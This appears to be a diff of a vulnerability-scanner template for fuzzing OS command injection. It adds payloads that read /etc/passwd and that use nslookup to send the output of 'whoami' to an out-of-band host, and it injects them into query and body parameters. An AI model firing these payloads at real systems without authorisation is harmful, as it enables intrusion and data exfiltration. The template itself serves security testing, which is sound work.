@@ -5,47 +5,44 @@ info:
   name: OS Commaind Injection Fuzz
   risk: High
 
+
+params:
+  - ssrf: "{{.oob}}"
+
+
 # origin: gonna come from Burp
 payloads:
 # OS Comman Injection:
   - 'echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
-  - '%20echo%20TDJHRY$((282037%2B31337))$(echo%20TDJHRY)TDJHRY'
-  - ';echo%20MPCSBG$((282037%2B31337))$(echo%20MPCSBG)MPCSBG'
-  - '&echo%20NWMZCF$((282037%2B31337))$(echo%20NWMZCF)NWMZCF'
-  - '|echo%20TJEGSE$((282037%2B31337))$(echo%20TJEGSE)TJEGSE'
-  - '||echo%20ANSBHE$((282037%2B31337))$(echo%20ANSBHE)ANSBHE'
-  - '&&echo%20PVJXOS$((282037%2B31337)$(echo%20PVJXOS)PVJXOS'
-  - '%0aecho%20VVIEOJ$((282037%2B31337))$(echo%20VVIEOJ)VVIEOJ'
-  - '%3Becho%20SRPJET$((282037%2B31337))$(echo%20SRPJET)SRPJET'
-  - '%26echo%20NQPWBV$((282037%2B31337))$(echo%20NQPWBV)NQPWBV'
-  - '%26%26echo%20QOZRFB$((282037%2B31337)$(echo%20QOZRFB)QOZRFB'
-  - '%7Cecho%20IRODNG$((282037%2B31337))$(echo%20IRODNG)IRODNG'
-  - '%7C%7Cecho%20KRCSNE$((282037%2B31337))$(echo%20KRCSNE)KRCSNE'
+  - '%20echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - ';echo%20echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '&echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '|echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '||echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '&&echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%0aecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%3Becho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%26echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%26%26echo%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%7Cecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%7C%7Cecho%20AGIYMZ$((282037%2B31337))$(echo%20AGIYMZ)AGIYMZ'
+  - '%26%26cat${IFS}/etc/passwd'
+  - '%26%26cat /etc/passwd'
+  - 'nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - ' nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - ';nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '&nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '|nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '||nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
+  - '&&nslookup `whoami`.{{.Domain}}.rce.{{.ssrf}}'
 
-# Time Based OS Command Injection
-  - 'sleep%203'
-  - '%20sleep%203'
-  - ';sleep%203'
-  - '&sleep%203'
-  - '|sleep%203'
-  - '||sleep%203'
-  - '&&sleep%203'
-  - '%0asleep%203'
-  - '%3Bsleep%203'
-  - '%26sleep%203'
-  - '%26%26sleep%203'
-  - '%7Csleep%203'
-  - '%7C%7Csleep%203'
-    
+   
 requests:
   - redirect: true
   - generators:
       # Change exist content type or adding new one
-      - Query("[[.original]]{{.payload}}")
-      - Path("[[.original]]{{.payload}}")
-      
+      - Query("{{.payload}}")
+      - Body("{{.payload}}")
     detections:
       - >-
-        StringSearch("response", "313374")
-      - >-
-        ResponeTime() > 2
+        RegexSearch("response", "root:[x*]:0:0:|AGIYMZ313374AGIYMZAGIYMZ")
